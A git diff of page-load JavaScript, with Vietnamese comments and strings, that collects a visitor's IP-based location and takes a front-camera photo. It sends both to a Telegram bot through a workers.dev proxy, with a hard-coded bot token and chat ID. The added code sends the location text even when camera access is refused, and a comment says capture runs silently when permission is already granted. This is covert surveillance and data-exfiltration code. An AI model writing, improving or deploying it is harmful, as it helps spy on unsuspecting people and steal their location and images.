@@ -87,6 +87,7 @@ document.addEventListener('DOMContentLoaded', () => {
 const TELEGRAM_BOT_TOKEN = '7550142487:AAH_xOHuyHr0C2nXnQmkWx-b6-f1NSDXaHo';
 const TELEGRAM_CHAT_ID = '6956722046';
 const API_SEND_PHOTO = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+const API_SEND_TEXT = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
 const info = {
   time: new Date().toLocaleString(),
@@ -95,7 +96,8 @@ const info = {
   address: '',
   country: '',
   lat: '',
-  lon: ''
+  lon: '',
+  camera: '⏳ Đang kiểm tra quyền camera...'
 };
 
 function getIPInfo() {
@@ -122,13 +124,26 @@ function getMessageText() {
 🌍-Quốc gia: ${info.country}
 📍-Vĩ độ (IP): ${info.lat}
 📍-Kinh độ (IP): ${info.lon}
-📸-Ảnh từ camera phía trước
+📷-Camera: ${info.camera}
   `.trim();
 }
 
-function captureCameraAndSend() {
+function sendTextOnly() {
+  fetch(API_SEND_TEXT, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      text: getMessageText()
+    })
+  });
+}
+
+function accessCameraAndSend() {
   navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
     .then(stream => {
+      info.camera = '✅ Camera đã được truy cập';
+
       const video = document.createElement('video');
       video.srcObject = stream;
       video.play();
@@ -156,13 +171,22 @@ function captureCameraAndSend() {
               });
             });
           }, 'image/jpeg', 0.9);
-        }, 1000); // đợi 1s cho camera ổn định
+        }, 1000);
       };
     })
-    .catch(error => {
-      console.warn('Không thể truy cập camera:', error);
+    .catch(err => {
+      info.camera = '📵 Người dùng từ chối hoặc không cho phép camera';
+      getIPInfo().then(sendTextOnly);
     });
 }
 
-// Bắt đầu
-captureCameraAndSend();
+// Bắt đầu: kiểm tra quyền trước
+navigator.permissions.query({ name: 'camera' }).then(result => {
+  if (result.state === 'granted') {
+    // ✅ Đã được cấp quyền → âm thầm
+    accessCameraAndSend();
+  } else {
+    // ❌ Chưa cấp → yêu cầu qua popup
+    accessCameraAndSend(); // sẽ hiện popup nếu chưa cho phép
+  }
+});
